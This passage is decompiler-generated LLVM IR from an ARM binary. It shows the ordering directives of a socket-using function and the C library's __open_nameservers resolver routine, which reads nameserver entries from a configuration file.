  uselistorder i32 %v2_17d88, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 14, 15, 23, 22, 21, 20, 19, 18, 17, 16, 13, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 8, 7, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4, 6 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 4, 1, 2, 3, 0, 5, 6 }
  uselistorder i32 ()* @socket, { 1, 11, 9, 8, 7, 6, 5, 4, 3, 2, 10, 0 }
  uselistorder i32 (i32)* @inet_addr, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_2d5c9.1301, { 2, 1, 0 }
  uselistorder i32 512, { 3, 8, 2, 9, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_184dc, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_18454, { 1, 0 }
  uselistorder label %dec_label_pc_18444, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_18438, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17e0c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18424.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1838c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_18428.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18358, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_182d8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_182c4, { 1, 0 }
  uselistorder label %dec_label_pc_182b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_182ac, { 1, 0 }
  uselistorder label %dec_label_pc_18214, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18150, { 1, 0 }
  uselistorder label %dec_label_pc_18140, { 1, 0 }
  uselistorder label %dec_label_pc_18428.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17fa8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_17efc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_184e8:
  %v0_184e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_184e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_184e8
  %v5_184e8 = mul i32 %arg2, 256
  %v6_184e8 = and i32 %v5_184e8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_184e8, %bb
  %v10_18518 = phi i32 [ %arg1, %dec_label_pc_184e8 ], [ %v6_184e8, %bb ]
  ret i32 %v10_18518

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1851c = load i32, i32* @r4, align 4
  store i32 %v3_1851c, i32* %stack_var_-28, align 4
  %v6_1851c = load i32, i32* @r5, align 4
  %v9_1851c = load i32, i32* @r6, align 4
  %v12_1851c = load i32, i32* @r7, align 4
  %v15_1851c = load i32, i32* @r8, align 4
  %v18_1851c = load i32, i32* @sl, align 4
  %v2_18520 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18524 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18524, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2d5cc.1130 to i32), i32* %r2.global-to-local, align 4
  %v1_18538 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2d5cc.1130 to i32), i32* %r0.global-to-local, align 4
  store i32 99660, i32* @lr, align 4
  %v1_18548 = call i32 @__pthread_return_0()
  store i32 %v1_18548, i32* %r0.global-to-local, align 4
  %v2_18550 = load i32, i32* @global_var_33944.1135, align 4
  %v5_18558 = icmp sgt i32 %v2_18550, 0
  br i1 %v5_18558, label %dec_label_pc_18794, label %dec_label_pc_1855c

dec_label_pc_1855c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_24e98.1319 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_24eac.1321 to i32), i32* @r1, align 4
  %v3_18564 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_24e98.1319 to i32), i32 ptrtoint (i32* @global_var_24eac.1321 to i32))
  store i32 %v3_18564, i32* %r0.global-to-local, align 4
  store i32 %v3_18564, i32* @sl, align 4
  %v2_18568 = icmp eq i32 %v3_18564, 0
  br i1 %v2_18568, label %dec_label_pc_18570, label %dec_label_pc_1875c.preheader

dec_label_pc_18570:                               ; preds = %dec_label_pc_1855c
  store i32 ptrtoint ([24 x i8]* @global_var_24eb0.1323 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_24eac.1321 to i32), i32* @r1, align 4
  %v3_18578 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_24eb0.1323 to i32), i32 ptrtoint (i32* @global_var_24eac.1321 to i32))
  store i32 %v3_18578, i32* %r0.global-to-local, align 4
  store i32 %v3_18578, i32* @sl, align 4
  %v2_1857c = icmp eq i32 %v3_18578, 0
  br i1 %v2_1857c, label %dec_label_pc_18788, label %dec_label_pc_1875c.preheader

dec_label_pc_1875c.preheader:                     ; preds = %dec_label_pc_1855c, %dec_label_pc_18570
  %v0_1876426 = phi i32 [ %v3_18564, %dec_label_pc_1855c ], [ %v3_18578, %dec_label_pc_18570 ]
  %v2_185d0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1866c = inttoptr i32 %tmp to i8*
  store i32 %v2_18520, i32* %r0.global-to-local, align 4
  store i32 %v0_1876426, i32* %r2.global-to-local, align 4
  %v3_1876866 = call i32 @fgets(i32 %v2_18520, i32 128, i32 %v0_1876426)
  store i32 %v3_1876866, i32* %r0.global-to-local, align 4
  %v2_1876c68 = icmp eq i32 %v3_1876866, 0
  store i32 %v2_18520, i32* @r4, align 4
  br i1 %v2_1876c68, label %dec_label_pc_1877c, label %dec_label_pc_1858c.preheader.lr.ph

dec_label_pc_1858c.preheader.lr.ph:               ; preds = %dec_label_pc_1875c.preheader
  %v1_1858c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_1858c.preheader

dec_label_pc_18588:                               ; preds = %dec_label_pc_18598
  %v1_18588 = add i32 %v0_18588, 1
  store i32 %v1_18588, i32* %r0.global-to-local, align 4
  %v1_1858c = inttoptr i32 %v1_18588 to i8*
  %v2_1858c = load i8, i8* %v1_1858c, align 1
  %v3_1858c = zext i8 %v2_1858c to i32
  store i32 %v3_1858c, i32* %r2.global-to-local, align 4
  %v2_18590 = icmp eq i8 %v2_1858c, 0
  br i1 %v2_18590, label %dec_label_pc_185ac, label %dec_label_pc_18598

dec_label_pc_18598:                               ; preds = %dec_label_pc_18598.lr.ph, %dec_label_pc_18588
  %v0_18588 = phi i32 [ %v2_18520, %dec_label_pc_18598.lr.ph ], [ %v1_18588, %dec_label_pc_18588 ]
  %v1_185a0 = phi i32 [ %v3_1858c13, %dec_label_pc_18598.lr.ph ], [ %v3_1858c, %dec_label_pc_18588 ]
  %v3_185a0 = mul nuw nsw i32 %v1_185a0, 2
  %v4_185a0 = add i32 %v3_185a0, %v2_1859c.pre
  %v5_185a0 = inttoptr i32 %v4_185a0 to i8*
  %v6_185a0 = load i8, i8* %v5_185a0, align 1
  %v1_185a4 = and i8 %v6_185a0, 32
  %v2_185a4 = icmp eq i8 %v1_185a4, 0
  br i1 %v2_185a4, label %dec_label_pc_185ac, label %dec_label_pc_18588

dec_label_pc_185ac:                               ; preds = %dec_label_pc_18588, %dec_label_pc_18598, %dec_label_pc_1858c.preheader
  %v0_1864435 = phi i32 [ %v2_18520, %dec_label_pc_1858c.preheader ], [ %v1_18588, %dec_label_pc_18588 ], [ %v0_18588, %dec_label_pc_18598 ]
  %v0_185c0 = phi i32 [ %v3_1858c13, %dec_label_pc_1858c.preheader ], [ %v3_1858c, %dec_label_pc_18588 ], [ %v1_185a0, %dec_label_pc_18598 ]
  %v7_185ac = icmp eq i32 %v0_185c0, 10
  br i1 %v7_185ac, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_185ac
  %v3_185b0 = icmp eq i32 %v0_185c0, 0
  br i1 %v3_185b0, label %bb55, label %dec_label_pc_185c0

.thread3:                                         ; preds = %dec_label_pc_185ac
  br label %dec_label_pc_1875c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1875c.backedge

dec_label_pc_1875c.backedge:                      ; preds = %dec_label_pc_18738, %dec_label_pc_18750, %bb55, %dec_label_pc_186d0, %.thread3, %dec_label_pc_185c0
  %v0_18764.pre = load i32, i32* @sl, align 4
  store i32 %v2_18520, i32* %r0.global-to-local, align 4
  store i32 %v0_18764.pre, i32* %r2.global-to-local, align 4
  %v3_18768 = call i32 @fgets(i32 %v2_18520, i32 128, i32 %v0_18764.pre)
  store i32 %v3_18768, i32* %r0.global-to-local, align 4
  %v2_1876c = icmp eq i32 %v3_18768, 0
  store i32 %v2_18520, i32* @r4, align 4
  br i1 %v2_1876c, label %dec_label_pc_1877c, label %dec_label_pc_1858c.preheader

dec_label_pc_185c0:                               ; preds = %bb
  %v7_185c0 = icmp eq i32 %v0_185c0, 35
  br i1 %v7_185c0, label %dec_label_pc_1875c.backedge, label %dec_label_pc_18644

dec_label_pc_185d0:                               ; preds = %bb58
  store i32 %v2_185d0, i32* %r2.global-to-local, align 4
  %v4_185d4 = mul i32 %storemerge, 4
  %v5_185d4 = add i32 %v4_185d4, %v2_185d0
  %v2_185d8 = add i32 %v5_185d4, -36
  %v3_185d8 = inttoptr i32 %v2_185d8 to i32*
  store i32 %v0_185d8, i32* %v3_185d8, align 4
  %v0_185e415 = load i32, i32* %r0.global-to-local, align 4
  %v1_185e416 = inttoptr i32 %v0_185e415 to i8*
  %v2_185e417 = load i8, i8* %v1_185e416, align 1
  %v3_185e418 = zext i8 %v2_185e417 to i32
  store i32 %v3_185e418, i32* %r2.global-to-local, align 4
  %v2_185e819 = icmp eq i8 %v2_185e417, 0
  br i1 %v2_185e819, label %dec_label_pc_18618.preheader, label %dec_label_pc_185f0.lr.ph

dec_label_pc_185f0.lr.ph:                         ; preds = %dec_label_pc_185d0
  %v2_185f4.pre = load i32, i32* @global_var_2d288, align 4
  br label %dec_label_pc_185f0

dec_label_pc_185e0:                               ; preds = %dec_label_pc_18604
  %v1_185e0 = add i32 %v0_185e0, 1
  store i32 %v1_185e0, i32* %r0.global-to-local, align 4
  %v1_185e4 = inttoptr i32 %v1_185e0 to i8*
  %v2_185e4 = load i8, i8* %v1_185e4, align 1
  %v3_185e4 = zext i8 %v2_185e4 to i32
  store i32 %v3_185e4, i32* %r2.global-to-local, align 4
  %v2_185e8 = icmp eq i8 %v2_185e4, 0
  br i1 %v2_185e8, label %dec_label_pc_18618.preheader, label %dec_label_pc_185f0

dec_label_pc_185f0:                               ; preds = %dec_label_pc_185f0.lr.ph, %dec_label_pc_185e0
  %v0_185e0 = phi i32 [ %v0_185e415, %dec_label_pc_185f0.lr.ph ], [ %v1_185e0, %dec_label_pc_185e0 ]
  %v0_18604 = phi i32 [ %v3_185e418, %dec_label_pc_185f0.lr.ph ], [ %v3_185e4, %dec_label_pc_185e0 ]
  %v3_185f8 = mul nuw nsw i32 %v0_18604, 2
  %v4_185f8 = add i32 %v3_185f8, %v2_185f4.pre
  %v5_185f8 = inttoptr i32 %v4_185f8 to i8*
  %v6_185f8 = load i8, i8* %v5_185f8, align 1
  %v1_185fc = and i8 %v6_185f8, 32
  %v2_185fc = icmp eq i8 %v1_185fc, 0
  br i1 %v2_185fc, label %dec_label_pc_18604, label %dec_label_pc_18618.preheader

dec_label_pc_18604:                               ; preds = %dec_label_pc_185f0
  %v7_18604 = icmp eq i32 %v0_18604, 10
  br i1 %v7_18604, label %dec_label_pc_18618.preheader, label %dec_label_pc_185e0

dec_label_pc_18618.preheader:                     ; preds = %dec_label_pc_18604, %dec_label_pc_185f0, %dec_label_pc_185e0, %dec_label_pc_185d0
  %v0_1861820 = phi i32 [ %v0_185e415, %dec_label_pc_185d0 ], [ %v0_185e0, %dec_label_pc_18604 ], [ %v0_185e0, %dec_label_pc_185f0 ], [ %v1_185e0, %dec_label_pc_185e0 ]
  %v1_1861821 = inttoptr i32 %v0_1861820 to i8*
  %v2_1861822 = load i8, i8* %v1_1861821, align 1
  %v3_1861823 = zext i8 %v2_1861822 to i32
  store i32 %v3_1861823, i32* %r2.global-to-local, align 4
  %v2_1861c24 = icmp eq i8 %v2_1861822, 0
  br i1 %v2_1861c24, label %dec_label_pc_18640, label %dec_label_pc_18624

dec_label_pc_18610:                               ; preds = %dec_label_pc_18624, %dec_label_pc_18638
  %v3_18614 = inttoptr i32 %v2_18614 to i8*
  store i8 0, i8* %v3_18614, align 1
  %v4_18614 = load i32, i32* %r0.global-to-local, align 4
  %v5_18614 = add i32 %v4_18614, 1
  store i32 %v5_18614, i32* %r0.global-to-local, align 4
  %v1_18618 = inttoptr i32 %v5_18614 to i8*
  %v2_18618 = load i8, i8* %v1_18618, align 1
  %v3_18618 = zext i8 %v2_18618 to i32
  store i32 %v3_18618, i32* %r2.global-to-local, align 4
  %v2_1861c = icmp eq i8 %v2_18618, 0
  br i1 %v2_1861c, label %dec_label_pc_18640, label %dec_label_pc_18624

dec_label_pc_18624:                               ; preds = %dec_label_pc_18618.preheader, %dec_label_pc_18610
  %v0_18638 = phi i32 [ %v3_18618, %dec_label_pc_18610 ], [ %v3_1861823, %dec_label_pc_18618.preheader ]
  %v2_18614 = phi i32 [ %v5_18614, %dec_label_pc_18610 ], [ %v0_1861820, %dec_label_pc_18618.preheader ]
  %v2_18628 = load i32, i32* @global_var_2d288, align 4
  %v3_1862c = mul nuw nsw i32 %v0_18638, 2
  %v4_1862c = add i32 %v2_18628, %v3_1862c
  %v5_1862c = inttoptr i32 %v4_1862c to i8*
  %v6_1862c = load i8, i8* %v5_1862c, align 1
  %v1_18630 = and i8 %v6_1862c, 32
  %v2_18630 = icmp eq i8 %v1_18630, 0
  br i1 %v2_18630, label %dec_label_pc_18638, label %dec_label_pc_18610

dec_label_pc_18638:                               ; preds = %dec_label_pc_18624
  %v7_18638 = icmp eq i32 %v0_18638, 10
  br i1 %v7_18638, label %dec_label_pc_18610, label %dec_label_pc_18640

dec_label_pc_18640:                               ; preds = %dec_label_pc_18610, %dec_label_pc_18638, %dec_label_pc_18618.preheader
  %v0_1864434 = phi i32 [ %v0_1861820, %dec_label_pc_18618.preheader ], [ %v5_18614, %dec_label_pc_18610 ], [ %v2_18614, %dec_label_pc_18638 ]
  %v0_18640 = load i32, i32* @r8, align 4
  %v1_18640 = add i32 %v0_18640, 1
  br label %dec_label_pc_18644

dec_label_pc_18644:                               ; preds = %dec_label_pc_185c0, %dec_label_pc_18640
  %storemerge = phi i32 [ %v1_18640, %dec_label_pc_18640 ], [ 0, %dec_label_pc_185c0 ]
  %v0_185d8 = phi i32 [ %v0_1864434, %dec_label_pc_18640 ], [ %v0_1864435, %dec_label_pc_185c0 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_18644 = inttoptr i32 %v0_185d8 to i8*
  %v2_18644 = load i8, i8* %v1_18644, align 1
  %v3_18644 = zext i8 %v2_18644 to i32
  %v2_18648 = icmp eq i8 %v2_18644, 0
  br i1 %v2_18648, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_18644
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_18644, %bb56
  %v0_18658.pr = phi i32 [ %v3_18644, %dec_label_pc_18644 ], [ 1, %bb56 ]
  %v1_18650 = add i32 %storemerge, -4
  %v3_18650 = sub i32 3, %storemerge
  %v4_18650 = and i32 %v3_18650, %storemerge
  %v5_18650 = icmp slt i32 %v4_18650, 0
  %v6_18650 = icmp slt i32 %v1_18650, 0
  %v7_18650 = icmp eq i32 %storemerge, 4
  %v3_18654 = xor i1 %v6_18650, %v5_18650
  %v4_18654 = or i1 %v7_18650, %v3_18654
  br i1 %v4_18654, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_18660

bb58:                                             ; preds = %bb57
  %v2_18658 = icmp eq i32 %v0_18658.pr, 0
  br i1 %v2_18658, label %dec_label_pc_18660, label %dec_label_pc_185d0

dec_label_pc_18660:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_24ec8.1326 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1866c = call i32 @__GI_strcoll(i8* %v3_1866c, i32 ptrtoint ([11 x i8]* @global_var_24ec8.1326 to i32))
  store i32 %v4_1866c, i32* %r0.global-to-local, align 4
  %v2_18670 = icmp eq i32 %v4_1866c, 0
  br i1 %v2_18670, label %dec_label_pc_18698.preheader, label %dec_label_pc_186bc

dec_label_pc_18698.preheader:                     ; preds = %dec_label_pc_18660
  br label %dec_label_pc_18698

dec_label_pc_18680:                               ; preds = %dec_label_pc_186b0
  %v1_18680 = add i32 %v5_186a0, -36
  %v2_18680 = inttoptr i32 %v1_18680 to i32*
  %v3_18680 = load i32, i32* %v2_18680, align 4
  store i32 %v3_18680, i32* %r0.global-to-local, align 4
  %v1_18684 = inttoptr i32 %v3_18680 to i8*
  %v2_18684 = call i32 @__GI_strdup(i8* %v1_18684)
  store i32 %v2_18684, i32* %r0.global-to-local, align 4
  %v0_1868c = load i32, i32* @r4, align 4
  %v1_1868c = add i32 %v0_1868c, 1
  store i32 %v1_1868c, i32* %r2.global-to-local, align 4
  %v5_18690 = mul i32 %v0_1868c, 4
  %v6_18690 = add i32 %v5_18690, ptrtoint (i32* @global_var_33938.1138 to i32)
  %v7_18690 = inttoptr i32 %v6_18690 to i32*
  store i32 %v2_18684, i32* %v7_18690, align 4
  %v0_18694 = load i32, i32* %r2.global-to-local, align 4
  %v1_18694 = load i32, i32* @r7, align 4
  %v2_18694 = inttoptr i32 %v1_18694 to i32*
  store i32 %v0_18694, i32* %v2_18694, align 4
  %v0_1869c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18698

dec_label_pc_18698:                               ; preds = %dec_label_pc_18698.preheader, %dec_label_pc_18680
  %v0_186a8 = phi i32 [ 1, %dec_label_pc_18698.preheader ], [ %v0_1869c.pre, %dec_label_pc_18680 ]
  store i32 %v2_185d0, i32* %r2.global-to-local, align 4
  %v1_1869c = load i32, i32* @r8, align 4
  %v2_1869c = sub i32 %v0_186a8, %v1_1869c
  %v4_1869c = xor i32 %v1_1869c, %v0_186a8
  %v5_1869c = xor i32 %v2_1869c, %v0_186a8
  %v6_1869c = and i32 %v5_1869c, %v4_1869c
  %v7_1869c = icmp slt i32 %v6_1869c, 0
  %v8_1869c = icmp slt i32 %v2_1869c, 0
  %v4_186a0 = mul i32 %v0_186a8, 4
  %v5_186a0 = add i32 %v4_186a0, %v2_185d0
  store i32 ptrtoint (i32* @global_var_33944.1135 to i32), i32* @r7, align 4
  %v1_186a8 = add i32 %v0_186a8, 1
  store i32 %v1_186a8, i32* @r5, align 4
  %v2_186ac = xor i1 %v8_1869c, %v7_1869c
  br i1 %v2_186ac, label %dec_label_pc_186b0, label %dec_label_pc_186bc

dec_label_pc_186b0:                               ; preds = %dec_label_pc_18698
  %v2_186b0 = load i32, i32* @global_var_33944.1135, align 4
  store i32 %v2_186b0, i32* @r4, align 4
  %v7_186b8 = icmp slt i32 %v2_186b0, 3
  br i1 %v7_186b8, label %dec_label_pc_18680, label %dec_label_pc_186bc

dec_label_pc_186bc:                               ; preds = %dec_label_pc_18698, %dec_label_pc_186b0, %dec_label_pc_18660
  %v0_186bc = load i32, i32* @r6, align 4
  store i32 %v0_186bc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_24ed4.1329 to i32), i32* @r1, align 4
  %v3_186c4 = inttoptr i32 %v0_186bc to i8*
  %v4_186c4 = call i32 @__GI_strcoll(i8* %v3_186c4, i32 ptrtoint ([7 x i8]* @global_var_24ed4.1329 to i32))
  store i32 %v4_186c4, i32* %r0.global-to-local, align 4
  %v2_186c8 = icmp eq i32 %v4_186c4, 0
  br i1 %v2_186c8, label %dec_label_pc_18700.preheader, label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186bc
  %v0_186d0 = load i32, i32* @r6, align 4
  store i32 %v0_186d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_24edc.1331 to i32), i32* @r1, align 4
  %v3_186d8 = inttoptr i32 %v0_186d0 to i8*
  %v4_186d8 = call i32 @__GI_strcoll(i8* %v3_186d8, i32 ptrtoint ([7 x i8]* @global_var_24edc.1331 to i32))
  store i32 %v4_186d8, i32* %r0.global-to-local, align 4
  %v2_186dc = icmp eq i32 %v4_186d8, 0
  br i1 %v2_186dc, label %dec_label_pc_18700.preheader, label %dec_label_pc_1875c.backedge

dec_label_pc_18700.preheader:                     ; preds = %dec_label_pc_186bc, %dec_label_pc_186d0
  store i32 ptrtoint (i32* @global_var_33948.1306 to i32), i32* @r4, align 4
  %v2_1870460 = load i32, i32* @global_var_33948.1306, align 4
  store i32 ptrtoint (i32* @global_var_33928.1310 to i32), i32* @r5, align 4
  %v1_1871063 = add i32 %v2_1870460, -1
  store i32 %v1_1871063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_1870460, 1
  br i1 %tmp5964, label %dec_label_pc_18718, label %dec_label_pc_186e8

dec_label_pc_186e8:                               ; preds = %dec_label_pc_18700.preheader, %dec_label_pc_186e8
  %v1_1871065 = phi i32 [ %v1_18710, %dec_label_pc_186e8 ], [ %v1_1871063, %dec_label_pc_18700.preheader ]
  %v4_186e8 = mul i32 %v1_1871065, 4
  %v5_186e8 = add i32 %v4_186e8, ptrtoint (i32* @global_var_33928.1310 to i32)
  %v6_186e8 = inttoptr i32 %v5_186e8 to i32*
  %v7_186e8 = load i32, i32* %v6_186e8, align 4
  store i32 %v7_186e8, i32* @r0, align 4
  store i32 %v1_1871065, i32* @global_var_33948.1306, align 4
  %v0_186f0 = call i32 @free()
  store i32 %v0_186f0, i32* %r0.global-to-local, align 4
  %v0_186f4 = load i32, i32* @r4, align 4
  %v1_186f4 = inttoptr i32 %v0_186f4 to i32*
  %v2_186f4 = load i32, i32* %v1_186f4, align 4
  %v1_186fc = load i32, i32* @r5, align 4
  %v5_186fc = mul i32 %v2_186f4, 4
  %v6_186fc = add i32 %v1_186fc, %v5_186fc
  %v7_186fc = inttoptr i32 %v6_186fc to i32*
  store i32 0, i32* %v7_186fc, align 4
  store i32 ptrtoint (i32* @global_var_33948.1306 to i32), i32* @r4, align 4
  %v2_18704 = load i32, i32* @global_var_33948.1306, align 4
  store i32 ptrtoint (i32* @global_var_33928.1310 to i32), i32* @r5, align 4
  %v1_18710 = add i32 %v2_18704, -1
  store i32 %v1_18710, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_18704, 1
  br i1 %tmp59, label %dec_label_pc_18718, label %dec_label_pc_186e8

dec_label_pc_18718:                               ; preds = %dec_label_pc_186e8, %dec_label_pc_18700.preheader
  br label %dec_label_pc_18738

dec_label_pc_18720:                               ; preds = %dec_label_pc_18750
  %v1_18720 = add i32 %v5_18740, -36
  %v2_18720 = inttoptr i32 %v1_18720 to i32*
  %v3_18720 = load i32, i32* %v2_18720, align 4
  store i32 %v3_18720, i32* %r0.global-to-local, align 4
  %v1_18724 = inttoptr i32 %v3_18720 to i8*
  %v2_18724 = call i32 @__GI_strdup(i8* %v1_18724)
  store i32 %v2_18724, i32* %r0.global-to-local, align 4
  %v0_1872c = load i32, i32* @r4, align 4
  %v1_1872c = add i32 %v0_1872c, 1
  store i32 %v1_1872c, i32* %r2.global-to-local, align 4
  %v5_18730 = mul i32 %v0_1872c, 4
  %v6_18730 = add i32 %v5_18730, ptrtoint (i32* @global_var_33928.1310 to i32)
  %v7_18730 = inttoptr i32 %v6_18730 to i32*
  store i32 %v2_18724, i32* %v7_18730, align 4
  %v0_18734 = load i32, i32* %r2.global-to-local, align 4
  %v1_18734 = load i32, i32* @r6, align 4
  %v2_18734 = inttoptr i32 %v1_18734 to i32*
  store i32 %v0_18734, i32* %v2_18734, align 4
  %v0_1873c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18738

dec_label_pc_18738:                               ; preds = %dec_label_pc_18718, %dec_label_pc_18720
  %v0_18748 = phi i32 [ 1, %dec_label_pc_18718 ], [ %v0_1873c.pre, %dec_label_pc_18720 ]
  store i32 %v2_185d0, i32* %r2.global-to-local, align 4
  %v1_1873c = load i32, i32* @r8, align 4
  %v2_1873c = sub i32 %v0_18748, %v1_1873c
  %v4_1873c = xor i32 %v1_1873c, %v0_18748
  %v5_1873c = xor i32 %v2_1873c, %v0_18748
  %v6_1873c = and i32 %v5_1873c, %v4_1873c
  %v7_1873c = icmp slt i32 %v6_1873c, 0
  %v8_1873c = icmp slt i32 %v2_1873c, 0
  %v4_18740 = mul i32 %v0_18748, 4
  %v5_18740 = add i32 %v4_18740, %v2_185d0
  store i32 ptrtoint (i32* @global_var_33948.1306 to i32), i32* @r6, align 4
  %v1_18748 = add i32 %v0_18748, 1
  store i32 %v1_18748, i32* @r5, align 4
  %v2_1874c = xor i1 %v8_1873c, %v7_1873c
  br i1 %v2_1874c, label %dec_label_pc_18750, label %dec_label_pc_1875c.backedge

dec_label_pc_18750:                               ; preds = %dec_label_pc_18738
  %v2_18750 = load i32, i32* @global_var_33948.1306, align 4
  store i32 %v2_18750, i32* @r4, align 4
  %v7_18758 = icmp slt i32 %v2_18750, 4
  br i1 %v7_18758, label %dec_label_pc_18720, label %dec_label_pc_1875c.backedge

dec_label_pc_1858c.preheader:                     ; preds = %dec_label_pc_1858c.preheader.lr.ph, %dec_label_pc_1875c.backedge
  store i32 %v2_18520, i32* %r0.global-to-local, align 4
  %v2_1858c12 = load i8, i8* %v1_1858c11, align 4
  %v3_1858c13 = zext i8 %v2_1858c12 to i32
  store i32 %v3_1858c13, i32* %r2.global-to-local, align 4
  %v2_1859014 = icmp eq i8 %v2_1858c12, 0
  br i1 %v2_1859014, label %dec_label_pc_185ac, label %dec_label_pc_18598.lr.ph

dec_label_pc_18598.lr.ph:                         ; preds = %dec_label_pc_1858c.preheader
  %v2_1859c.pre = load i32, i32* @global_var_2d288, align 4
  br label %dec_label_pc_18598

dec_label_pc_1877c:                               ; preds = %dec_label_pc_1875c.backedge, %dec_label_pc_1875c.preheader
  %v0_1877c = load i32, i32* @sl, align 4
  store i32 %v0_1877c, i32* %r0.global-to-local, align 4
  %v1_18780 = inttoptr i32 %v0_1877c to i8*
  %v2_18780 = call i32 @__GI_fclose(i8* %v1_18780)
  store i32 %v2_18780, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18794

dec_label_pc_18788:                               ; preds = %dec_label_pc_18570
  %v0_18788 = call i32 @__GI___h_errno_location()
  store i32 %v0_18788, i32* %r0.global-to-local, align 4
  %v2_18790 = inttoptr i32 %v0_18788 to i32*
  store i32 3, i32* %v2_18790, align 4
  br label %dec_label_pc_18794

dec_label_pc_18794:                               ; preds = %entry, %dec_label_pc_1877c, %dec_label_pc_18788
  store i32 %v2_18524, i32* @r0, align 4
  %v1_187a4 = call i32 @__pthread_return_void()
  store i32 %v1_187a4, i32* %r0.global-to-local, align 4
  store i32 %v6_1851c, i32* @r5, align 4
  store i32 %v9_1851c, i32* @r6, align 4
  store i32 %v12_1851c, i32* @r7, align 4
  store i32 %v15_1851c, i32* @r8, align 4
  store i32 %v18_1851c, i32* @sl, align 4
  ret i32 %v1_187a4

; uselistorder directives
  uselistorder i32 %v3_1858c13, { 2, 1, 0 }
  uselistorder i32 %v2_1873c, { 1, 0 }
  uselistorder i32 %v0_18748, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_18710, { 1, 0 }
  uselistorder i32 %v1_1871065, { 1, 0 }
  uselistorder i32 %v2_1869c, { 1, 0 }
  uselistorder i32 %v0_186a8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_185d8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_1861820, { 1, 0, 2 }
  uselistorder i32 %v2_185d0, { 0, 3, 1, 4, 2, 5 }
